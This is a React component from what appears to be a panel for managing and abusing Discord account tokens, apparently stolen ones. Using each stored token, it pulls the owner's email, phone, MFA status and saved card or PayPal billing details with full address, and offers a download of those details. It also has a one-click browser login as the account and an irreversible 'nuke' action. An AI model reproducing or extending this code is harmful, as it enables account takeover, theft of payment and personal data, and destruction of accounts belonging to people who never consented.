import React, { useState, useEffect } from "react";
import axios from "axios";
import { ClipLoader } from "react-spinners";
import Swal from "sweetalert2";
import { Tooltip } from "react-tooltip";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  faCopy,
  faCog,
  faTrashAlt,
  faEye,
  faSignInAlt,
  faRadiation,
} from "@fortawesome/free-solid-svg-icons";
import styles from "./AccountCard.module.css";
import sharedStyles from "../../sharedStyles.module.css";
import { useDiscordContext } from "../../../contexts/DiscordContext";
import { useWebSocketContext } from "../../../contexts/WebSocketContext";

const AccountCard = ({ account }) => {
  const [basicAccountDetails, setBasicAccountDetails] = useState(null);

  const [loading, setLoading] = useState(false);

  const { setAccounts } = useDiscordContext();
  const { websocket, connectionStatus, PENDING, SUCCESS, FAILED } =
    useWebSocketContext();

  const handleDeleteClick = async () => {
    if (account.cmd_in_progress) {
      return;
    }
    const { value: isConfirmed } = await Swal.fire({
      title: "Remove Account",
      icon: "warning",
      html: "<p>Are you sure you want to remove this account?</p><p><strong><u>This action is not reversable!</u></strong></p>",
      showCancelButton: true,
      confirmButtonColor: "#EF233C",
      cancelButtonColor: "#6FB2CD",
      confirmButtonText: "Remove",
    });
    if (isConfirmed) {
      axios
        .delete(
          `http://localhost:8080/accounts/delete-account/${account.account_id}`
        )
        .then((response) => {
          setAccounts(response.data);
        })
        .catch((error) => {
          console.error("Error deleting account:", error);
        });
    }
  };

  const handleEditClick = async () => {
    if (account.cmd_in_progress) {
      return;
    }
    const { value: token, isConfirmed } = await Swal.fire({
      title: "Enter a new account token",
      input: "text",
      showCancelButton: true,
      confirmButtonColor: "#6FB2CD",
      cancelButtonColor: "#CB67BC",
      inputValidator: (value) => {
        if (!value) {
          return "You need to enter an account token!";
        }
      },
    });

    if (isConfirmed && token) {
      axios
        .put(
          "http://localhost:8080/accounts/update-account",
          {
            AccountID: account.account_id,
            AccountToken: token,
          },
          { headers: { "Content-Type": "application/json" } }
        )
        .then((response) => {
          const updatedAccount = response.data[0];
          setAccounts((prevAccounts) =>
            prevAccounts.map((a) =>
              a.account_id === updatedAccount.account_id
                ? {
                    ...a,
                    account_token: updatedAccount.account_token,
                  }
                : a
            )
          );
        })
        .catch((error) => {
          console.error("Error updating account:", error);
        });
    }
  };

  const handleViewClick = async () => {
    try {
      const response = await axios.get(
        `/api/discord/users/@me/billing/payment-sources`,
        {
          headers: {
            Authorization: `${account.account_token}`,
          },
        }
      );
      const basicInfoHtml = `
          <div style="flex: 1; text-align: left; background-color: #F0F0F0; padding: 2.0rem; margin-right: 10px;">
            <p style="font-weight: bold;"><span role="img" aria-label="Info">ℹ️</span> Basic Info</p>
            ${
              basicAccountDetails.id
                ? `<p><strong>ID:</strong> ${basicAccountDetails.id}</p>`
                : ""
            }
            ${
              basicAccountDetails.username
                ? `<p><strong>Username:</strong> ${basicAccountDetails.username}</p>`
                : ""
            }
            ${
              basicAccountDetails.email
                ? `<p><strong>Email:</strong> ${basicAccountDetails.email}</p>`
                : ""
            }
            ${
              basicAccountDetails.phone
                ? `<p><strong>Phone:</strong> ${basicAccountDetails.phone}</p>`
                : ""
            }
            ${
              basicAccountDetails.mfa_enabled
                ? `<p><strong>Multi-Factor Authentication:</strong> Yes</p>`
                : "<p><strong>Multi-Factor Authentication:</strong> No</p>"
            }
          </div>
        `;

      const billingData = response.data.length > 0 ? response.data[0] : {};

      const billingAddress = billingData?.billing_address;
      const billingHtml = `
          <div style="flex: 1; text-align: left; background-color: #F0F0F0; padding: 2.0rem;">
            <p style="font-weight: bold;"><span role="img" aria-label="Credit Card">💳</span> Billing Info</p>
            ${
              billingData?.type === 1
                ? `
              ${
                billingData?.brand
                  ? `<p><strong>Card Brand:</strong> ${billingData?.brand}</p>`
                  : ""
              }
              ${
                billingData?.last_4
                  ? `<p><strong>Card Last 4:</strong> ${billingData?.last_4}</p>`
                  : ""
              }
              ${
                billingData?.expires_month && billingData?.expires_year
                  ? `<p><strong>Expiry Date:</strong> ${billingData?.expires_month}/${billingData?.expires_year}</p>`
                  : ""
              }
            `
                : billingData?.email
                ? `<p><strong>PayPal Email:</strong> ${billingData?.email}</p>`
                : ""
            }
            ${
              billingAddress?.name
                ? `<p><strong>Billing Name:</strong> ${billingAddress?.name}</p>`
                : ""
            }
            ${
              billingAddress?.line_1
                ? `<p><strong>Billing Address Ln.1:</strong> ${billingAddress?.line_1}</p>`
                : ""
            }
            ${
              billingAddress?.line_2
                ? `<p><strong>Billing Address Ln.2:</strong> ${billingAddress?.line_2}</p>`
                : ""
            }
            ${
              billingAddress?.city
                ? `<p><strong>Billing Address City:</strong> ${billingAddress?.city}</p>`
                : ""
            }
            ${
              billingAddress?.state
                ? `<p><strong>Billing Address State:</strong> ${billingAddress?.state}</p>`
                : ""
            }
            ${
              billingAddress?.country
                ? `<p><strong>Billing Address Country:</strong> ${billingAddress?.country}</p>`
                : ""
            }
            ${
              billingAddress?.postal_code
                ? `<p><strong>Billing Address Postal Code:</strong> ${billingAddress?.postal_code}</p>`
                : ""
            }
          </div>
        `;

      const containerHtml = `
        <div style="display: flex; justify-content: space-between;">
          ${basicInfoHtml}
          ${response.data && response.data.length > 0 ? billingHtml : ""}
        </div>
      `;

      await Swal.fire({
        title: `<strong>${basicAccountDetails.username}</strong>`,
        imageUrl: basicAccountDetails.avatar
          ? `https://cdn.discordapp.com/avatars/${basicAccountDetails.id}/${basicAccountDetails.avatar}.png`
          : "./Questionable Integral.svg",
        imageWidth: 80,
        imageHeight: 80,
        imageAlt: "Avatar",
        customClass: {
          image: styles.viewAvatar,
        },
        html: containerHtml,
        showCloseButton: true,
        confirmButtonColor: "#6FB2CD",
        focusConfirm: true,
        width: "auto",
        showDenyButton: true,
        denyButtonText: "Download",
        denyButtonColor: "#89CD7F",
        didOpen: () => {
          document
            .querySelector(".swal2-deny")
            .addEventListener("click", function () {
              const textToSave = containerHtml.replace(/<\/?[^>]+(>|$)/g, "");
              const blob = new Blob([textToSave], { type: "text/plain" });
              const url = URL.createObjectURL(blob);

              const a = document.createElement("a");
              a.href = url;
              a.download = `${basicAccountDetails.id}_details.txt`;
              a.click();

              URL.revokeObjectURL(url);
            });
        },
      });
    } catch (error) {
      console.error("Error fetching billing account details:", error);
    }
  };

  const handleLoginClick = async () => {
    if (
      websocket &&
      connectionStatus === "connected" &&
      account?.login_status !== PENDING
    ) {
      const { value: browser } = await Swal.fire({
        icon: "question",
        title: "Login",
        footer: "Other browsers are not currently supported!",
        input: "radio",
        inputOptions: {
          chrome: "Chrome",
          firefox: "Firefox",
          edge: "Edge",
        },
        inputValidator: (value) => {
          if (!value) {
            return "You need to choose a browser!";
          }
        },
        showCancelButton: true,
        cancelButtonText: "Cancel",
        confirmButtonText: "Select",
        confirmButtonColor: "#6FB2CD",
        cancelButtonColor: "#CB67BC",
      });

      if (browser) {
        const message = {
          action: "login",
          browser: browser,
          token: account.account_token,
          id: account.account_id,
        };
        websocket.send(JSON.stringify(message));
      }
    }
  };

  const handleNukeClick = async () => {
    if (
      websocket &&
      connectionStatus === "connected" &&
      account?.nuke_status !== PENDING
    ) {
      await Swal.fire({
        icon: "warning",
        title: "Nuke Account",
        html: "<p>Are you sure you want to nuke this account?</p><p><strong><u>This action is not reversable!</u></strong></p>",
        showCancelButton: true,
        cancelButtonText: "Cancel",
        confirmButtonText: "Nuke Account",
        confirmButtonColor: "#EF233C",
        cancelButtonColor: "#6FB2CD",
      }).then((result) => {
        if (result.isConfirmed) {
          const message = {
            action: "nuke",
            token: account.account_token,
            id: account.account_id,
          };
          websocket.send(JSON.stringify(message));
        }
      });
    }
  };

  useEffect(() => {
    switch (account?.login_status) {
      case SUCCESS:
        Swal.fire({
          position: "top-end",
          icon: "success",
          title: basicAccountDetails
            ? `Logged into ${basicAccountDetails.username}!`
            : `Logged into Discord!`,
          showConfirmButton: false,
          timer: 1500,
          toast: true,
        });
        break;
      case FAILED:
        Swal.fire({
          position: "top-end",
          icon: "error",
          title: "Login Failed :(",
          showConfirmButton: false,
          timer: 1500,
          toast: true,
        });
        break;
      default:
        break;
    }
  }, [
    account?.login_status,
    account?.account_id,
    basicAccountDetails,
    SUCCESS,
    FAILED,
  ]);

  useEffect(() => {
    switch (account?.nuke_status) {
      case SUCCESS:
        Swal.fire({
          position: "top-end",
          icon: "success",
          title: basicAccountDetails
            ? `Nuked ${basicAccountDetails.username}!`
            : `Nuked Account!`,
          showConfirmButton: false,
          timer: 1500,
          toast: true,
        });
        break;
      case FAILED:
        Swal.fire({
          position: "top-end",
          icon: "error",
          title: "Nuke Failed :(",
          showConfirmButton: false,
          timer: 1500,
          toast: true,
        });
        break;
      default:
        break;
    }
  }, [
    account?.nuke_status,
    account?.account_id,
    basicAccountDetails,
    SUCCESS,
    FAILED,
  ]);

  useEffect(() => {
    if (account?.account_token) {
      setLoading(true);
      axios
        .get(`/api/discord/users/@me`, {
          headers: {
            Authorization: `${account.account_token}`,
          },
        })
        .then((response) => {
          setBasicAccountDetails(response.data);
          setLoading(false);
        })
        .catch((error) => {
          console.error("Error fetching account details:", error);
          setBasicAccountDetails(null);
          setLoading(false);
        });
    }
  }, [account.account_token]);

  let content;

  if (loading) {
    content = <ClipLoader />;
  } else if (!account) {
    content = <p>Account not found.</p>;
  } else if (!basicAccountDetails) {
    content = <p>Error loading account details.</p>;
  } else {
    content = (
      <>
        <img
          src={
            basicAccountDetails.avatar
              ? `https://cdn.discordapp.com/avatars/${basicAccountDetails.id}/${basicAccountDetails.avatar}.png`
              : "./Questionable Integral.svg"
          }
          alt=""
          className={styles.avatar}
        />
        <h2 className={styles.name}>{basicAccountDetails.username}</h2>

        {basicAccountDetails && (
          <>
            <div className={styles.tokenContainer}>
              <div
                className={styles.tokenBox}
                onClick={() =>
                  setBasicAccountDetails((prev) => ({
                    ...prev,
                    showToken: !prev.showToken,
                  }))
                }
              >
                {basicAccountDetails.showToken
                  ? account.account_token
                  : "Reveal Token"}
              </div>
              <FontAwesomeIcon
                icon={faCopy}
                className={styles.copyBtn}
                onClick={() =>
                  navigator.clipboard.writeText(account.account_token)
                }
                data-tooltip-id="copy-tooltip"
                data-tooltip-content="Copy Token"
              />
            </div>
            <div className={styles.actionContainer}>
              <FontAwesomeIcon
                icon={faEye}
                className={styles.viewBtn}
                onClick={handleViewClick}
                data-tooltip-id="view-tooltip"
                data-tooltip-content="View Details"
              />
              <FontAwesomeIcon
                icon={faSignInAlt}
                className={
                  account?.login_status === PENDING
                    ? styles.pendingLoginBtn
                    : styles.loginBtn
                }
                onClick={handleLoginClick}
                data-tooltip-id="login-tooltip"
                data-tooltip-content={
                  account?.login_status === PENDING
                    ? "Login in progress..."
                    : "Login"
                }
              />
              <FontAwesomeIcon
                icon={faRadiation}
                className={
                  account?.nuke_status === PENDING
                    ? styles.pendingNukeBtn
                    : styles.nukeBtn
                }
                onClick={handleNukeClick}
                data-tooltip-id="nuke-tooltip"
                data-tooltip-content={
                  account?.nuke_status === PENDING
                    ? "Nuke in progress..."
                    : "Nuke"
                }
              />
            </div>
          </>
        )}
      </>
    );
  }

  return (
    <>
      <div className={sharedStyles.container}>
        <div className={styles.card}>
          {content}

          <FontAwesomeIcon
            icon={faCog}
            className={styles.editBtn}
            onClick={handleEditClick}
            data-tooltip-id="edit-tooltip"
            data-tooltip-content="Edit Account"
          />
          <FontAwesomeIcon
            icon={faTrashAlt}
            className={styles.deleteBtn}
            onClick={handleDeleteClick}
            data-tooltip-id="delete-tooltip"
            data-tooltip-content="Remove Account"
          />
        </div>
      </div>
      <Tooltip id="edit-tooltip" delayShow={100} />
      <Tooltip id="delete-tooltip" delayShow={100} />
      <Tooltip id="copy-tooltip" delayShow={100} />
      <Tooltip id="view-tooltip" delayShow={100} />
      <Tooltip id="login-tooltip" delayShow={100} />
      <Tooltip id="nuke-tooltip" delayShow={100} />
    </>
  );
};

export default AccountCard;
